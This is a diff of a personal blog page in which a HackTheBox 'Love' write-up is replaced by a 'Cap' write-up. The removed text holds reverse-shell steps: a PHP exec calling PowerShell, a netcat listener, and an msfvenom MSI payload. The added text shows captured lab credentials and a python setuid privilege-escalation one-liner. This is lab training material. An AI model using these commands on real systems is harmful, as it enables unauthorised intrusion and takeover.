@@ -11,7 +11,7 @@
 
 
 
-    <title>Love Writeup</title>
+    <title>Cap Writeup</title>
     <meta name="HandheldFriendly" content="True" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <!-- Styles'n'Scripts -->
@@ -36,25 +36,25 @@
     <!-- This tag outputs SEO meta+structured data and other important settings -->
     <meta name="description" content="Writeups by r3Z3l" />
     <link rel="shortcut icon" href="/assets/images/favicon.png" type="image/png" />
-    <link rel="canonical" href="/Love-writeup" />
+    <link rel="canonical" href="/cap-writeup" />
     <meta name="referrer" content="no-referrer-when-downgrade" />
 
      <!--title below is coming from _includes/dynamic_title-->
     <meta property="og:site_name" content="Writeups" />
     <meta property="og:type" content="website" />
-    <meta property="og:title" content="Love Writeup" />
-    <meta property="og:description" content="Easy Windows box from HackTheBox. starting with nmap scan we found many ports open but many are fake services. Firstly i enumerated port 80,443,5000 as they were running web services. #voting-exploit running a voting portal on port 80. Two exploits found for this : Unauthenticated RCE Authenticated RCE For Unauth" />
-    <meta property="og:url" content="/Love-writeup" />
-    <meta property="og:image" content="/assets/images/Love_logo.png" />
+    <meta property="og:title" content="Cap Writeup" />
+    <meta property="og:description" content="Easy Linux box from HackTheBox. On rustscan we found It has 3 ports open 21,22,80. first tried to use filezilla to login ftp but couldn’t. I needed credentials to login ftp. Let’s Enumerate webpage. I found it’s giving packets. Let’s try to check data packet 0. using wireshark. we got" />
+    <meta property="og:url" content="/cap-writeup" />
+    <meta property="og:image" content="/assets/images/cap_logo.png" />
     <meta property="article:publisher" content="https://www.linkedin.com/in/himanshu-kumar28" />
     <meta property="article:author" content="https://www.linkedin.com/in/himanshu-kumar28" />
-    <meta property="article:published_time" content="2021-07-02T03:30:00+05:30" />
-    <meta property="article:modified_time" content="2021-07-02T03:30:00+05:30" />
+    <meta property="article:published_time" content="2021-09-24T17:30:00+05:30" />
+    <meta property="article:modified_time" content="2021-09-24T17:30:00+05:30" />
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="Love Writeup" />
-    <meta name="twitter:description" content="Easy Windows box from HackTheBox. starting with nmap scan we found many ports open but many are fake services. Firstly i enumerated port 80,443,5000 as they were running web services. #voting-exploit running a voting portal on port 80. Two exploits found for this : Unauthenticated RCE Authenticated RCE For Unauth" />
+    <meta name="twitter:title" content="Cap Writeup" />
+    <meta name="twitter:description" content="Easy Linux box from HackTheBox. On rustscan we found It has 3 ports open 21,22,80. first tried to use filezilla to login ftp but couldn’t. I needed credentials to login ftp. Let’s Enumerate webpage. I found it’s giving packets. Let’s try to check data packet 0. using wireshark. we got" />
     <meta name="twitter:url" content="/" />
-    <meta name="twitter:image" content="/assets/images/Love_logo.png" />
+    <meta name="twitter:image" content="/assets/images/cap_logo.png" />
     <meta name="twitter:label1" content="Written by" />
     <meta name="twitter:data1" content="Writeups" />
     <meta name="twitter:site" content="@Himanshu_84ya" />
@@ -71,18 +71,18 @@
         "name": "Writeups",
         "logo": "/assets/images/blog-icon.jpg"
     },
-    "url": "/Love-writeup",
+    "url": "/cap-writeup",
     "image": {
         "@type": "ImageObject",
-        "url": "/assets/images/Love_logo.png",
+        "url": "/assets/images/cap_logo.png",
         "width": 2000,
         "height": 666
     },
     "mainEntityOfPage": {
         "@type": "WebPage",
-        "@id": "/Love-writeup"
+        "@id": "/cap-writeup"
     },
-    "description": "Easy Windows box from HackTheBox. starting with nmap scan we found many ports open but many are fake services. Firstly i enumerated port 80,443,5000 as they were running web services. #voting-exploit running a voting portal on port 80. Two exploits found for this : Unauthenticated RCE Authenticated RCE For Unauth"
+    "description": "Easy Linux box from HackTheBox. On rustscan we found It has 3 ports open 21,22,80. first tried to use filezilla to login ftp but couldn’t. I needed credentials to login ftp. Let’s Enumerate webpage. I found it’s giving packets. Let’s try to check data packet 0. using wireshark. we got"
 }
     </script>
 
@@ -95,7 +95,7 @@
     </script> -->
 
     <meta name="generator" content="Jekyll 3.6.2" />
-    <link rel="alternate" type="application/rss+xml" title="Love Writeup" href="/feed.xml" />
+    <link rel="alternate" type="application/rss+xml" title="Cap Writeup" href="/feed.xml" />
 
 
 </head>
@@ -157,80 +157,48 @@ into the {body} of the default.hbs template -->
 
             <header class="post-full-header">
                 <section class="post-full-meta">
-                    <time class="post-full-meta-date" datetime=" 2 July 2021"> 2 July 2021</time>
+                    <time class="post-full-meta-date" datetime="24 September 2021">24 September 2021</time>
                     
                 </section>
-                <h1 class="post-full-title">Love Writeup</h1>
+                <h1 class="post-full-title">Cap Writeup</h1>
             </header>
 
             
-            <figure class="post-full-image" style="background-image: url(/assets/images/Love_logo.png)">
+            <figure class="post-full-image" style="background-image: url(/assets/images/cap_logo.png)">
             </figure>
             
 
             <section class="post-full-content">
                 <div class="kg-card-markdown">
-                    <p>Easy Windows box from HackTheBox.</p>
+                    <p>Easy Linux box from HackTheBox.</p>
 
-<p>starting with nmap scan we found many ports open but many are fake services.
-Firstly i enumerated port 80,443,5000 as they were running web services.</p>
+<p>On rustscan we found It has 3 ports open 21,22,80.</p>
 
-<hr />
-<p>#voting-exploit</p>
+<p>first tried to use filezilla to login ftp but couldn’t.
+<img src="assets/images/Pasted image 20210615144701.png" alt="Pasted image 20210615144701.png" />
+I needed credentials to login ftp.</p>
 
-<p>running a voting portal on port 80.
-<em>Two exploits</em> found for this :</p>
-<ul>
-  <li><strong>Unauthenticated RCE</strong></li>
-  <li><strong>Authenticated RCE</strong></li>
-</ul>
+<p>Let’s Enumerate webpage. I found it’s giving packets.
+<img src="assets/images/Pasted image 20210615160539.png" alt="Pasted image 20210615160539.png" /></p>
 
-<h2 id="for-unauth-rce">For Unauth RCE</h2>
-<p>For Unauthenticated RCE we can upload powershell reverse script and execute using powershell.
-<code class="language-plaintext highlighter-rouge">&lt;?php echo exec("powershell reverse.ps1") ?&gt;</code></p>
+<p>Let’s try to check data packet 0.
+using wireshark.
+<img src="assets/images/Pasted image 20210614120303.png" alt="Pasted image 20210614120303.png" />
+we got credentials.
+user <strong>Nathan</strong> 
+password <strong>Buck3tH4TF0RM3!</strong> 
+We can ssh and ftp using these creds.
+on doing ssh we get #user-txt</p>
 
-<p>so, I get #reverse-shell.</p>
+<p>For root priv let’s run linpeas.sh
+We found that python has capabillity to setuid as 0.</p>
 
-<p>Note: for me first time unauth RCE worked but then it was not working.</p>
+<p><img src="assets/images/Pasted image 20210615144316.png" alt="Pasted image 20210615144316.png" /></p>
 
-<h2 id="for-auth-rce">For Auth RCE</h2>
-<p>I found staging.love.htb  for port 443 nmap scan. So, let’s add it in /etc/hosts.</p>
+<p>so run <code class="language-plaintext highlighter-rouge">python3 -c 'import os; os.setuid(0);os.system("/bin/sh")'</code></p>
 
-<p>On checking https://staging.love.htb, I found that I can scan any site using this and  nmap shown port 5000 which is forbidden to us.</p>
+<p>and we get root shell and finally #root-txt</p>
 
-<p>so let’s scan it.</p>
-
-<p>I tried many ways to scan it finally i scanned port 5000 on localhost.
-we can get credentials .
-<img src="assets/images/Pasted image 20210601172800.png" alt="Pasted image 20210601172800.png" /></p>
-
-<p>I tried exploit of searchsploit but it has some things misconfigured so i corrected it.
-I’m putting that RCE <a href="https://github.io/">here</a></p>
-
-<p>running listner using <code class="language-plaintext highlighter-rouge">rlwrap nc -lnvp 4444</code></p>
-
-<p>so, I got reverse shell as Phoebe user and got  #user-txt  by <code class="language-plaintext highlighter-rouge">type user.txt</code></p>
-
-<h1 id="root">Root</h1>
-<p>For Prive esc i thought to use sharpup.exe as it show min. things
-let’s upload SharpUp.exe using creating smbserver on our machine
-<code class="language-plaintext highlighter-rouge">impacket-smbserver kali .</code>    on kali</p>
-
-<p><code class="language-plaintext highlighter-rouge">copy \\ip\kali\SharpUp.exe SharpUp.exe</code> on windows</p>
-
-<p>On executing, it shows that registery permission is 1.
-<img src="assets/images/Pasted image 20210809160738.png" alt="Pasted image 20210809160738.png" /></p>
-
-<p>This permission allows any user to execute msi file.
-So, let’s create reverse.msi using msfvenom</p>
-
-<p><code class="language-plaintext highlighter-rouge">msfvenom -p windows\x64\reverse_tcp LHOST=ip LPORT=4242 -f msi -o reverse.msi</code></p>
-
-<p>run it as <code class="language-plaintext highlighter-rouge">msi /quiet /qn /i reverse.msi</code></p>
-
-<p>and you will get reverse shell as admin</p>
-
-<p>so, I got #root-txt  by <code class="language-plaintext highlighter-rouge">type root.txt</code></p>
 
                 </div>
             </section>
@@ -295,50 +263,6 @@ So, let’s create reverse.msi using msfvenom</p>
 
             <!-- If there's a next post, display it using the same markup included from - partials/post-card.hbs -->
             
-                
-
-    <article class="post-card post-template">
-        
-            <a class="post-card-image-link" href="/cap-writeup">
-                <div class="post-card-image" style="background-image: url(/assets/images/cap_logo.png)"></div>
-            </a>
-        
-        <div class="post-card-content">
-            <a class="post-card-content-link" href="/cap-writeup">
-                <header class="post-card-header">
-                    
-
-                    <h2 class="post-card-title">Cap Writeup</h2>
-                </header>
-                <section class="post-card-excerpt">
-                    
-                        <p>Easy Linux box from HackTheBox.
-</p>
-                    
-                </section>
-            </a>
-            <footer class="post-card-meta">
-                
-                    
-                        
-                        <img class="author-profile-image" src="/assets/images/ghost.png" alt="Himanshu Kumar" />
-                        
-                        <span class="post-card-author">
-                            <a href="/author/r3Z3l/">Himanshu Kumar</a>
-                        </span>
-                    
-                
-                <span class="reading-time">
-                    
-                    
-                      1 min read
-                    
-                </span>
-            </footer>
-        </div>
-    </article>
-
-            
 
             <!-- If there's a previous post, display it using the same markup included from - partials/post-card.hbs -->
             
@@ -346,20 +270,20 @@ So, let’s create reverse.msi using msfvenom</p>
 
     <article class="post-card post-template">
         
-            <a class="post-card-image-link" href="/Schooled-writeup">
-                <div class="post-card-image" style="background-image: url(/assets/images/schooled_logo.png)"></div>
+            <a class="post-card-image-link" href="/Love-writeup">
+                <div class="post-card-image" style="background-image: url(/assets/images/Love_logo.png)"></div>
             </a>
         
         <div class="post-card-content">
-            <a class="post-card-content-link" href="/Schooled-writeup">
+            <a class="post-card-content-link" href="/Love-writeup">
                 <header class="post-card-header">
                     
 
-                    <h2 class="post-card-title">Schooled Writeup</h2>
+                    <h2 class="post-card-title">Love Writeup</h2>
                 </header>
                 <section class="post-card-excerpt">
                     
-                        <p>Medium Linux box from HackTheBox.
+                        <p>Easy Windows box from HackTheBox.
 </p>
                     
                 </section>
@@ -402,18 +326,18 @@ So, let’s create reverse.msi using msfvenom</p>
         </a>
     </div>
     <span class="floating-header-divider">&mdash;</span>
-    <div class="floating-header-title">Love Writeup</div>
+    <div class="floating-header-title">Cap Writeup</div>
     <div class="floating-header-share">
         <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
     <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"/>
 </svg>
 </div>
-        <a class="floating-header-share-tw" href="https://twitter.com/share?text=Love+Writeup&amp;url=https://jekyllt.github.io/jasper2/Love-writeup"
+        <a class="floating-header-share-tw" href="https://twitter.com/share?text=Cap+Writeup&amp;url=https://jekyllt.github.io/jasper2/cap-writeup"
             onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
 
         </a>
-        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://jekyllt.github.io/jasper2/Love-writeup"
+        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://jekyllt.github.io/jasper2/cap-writeup"
             onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
             <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"/></svg>
         </a>
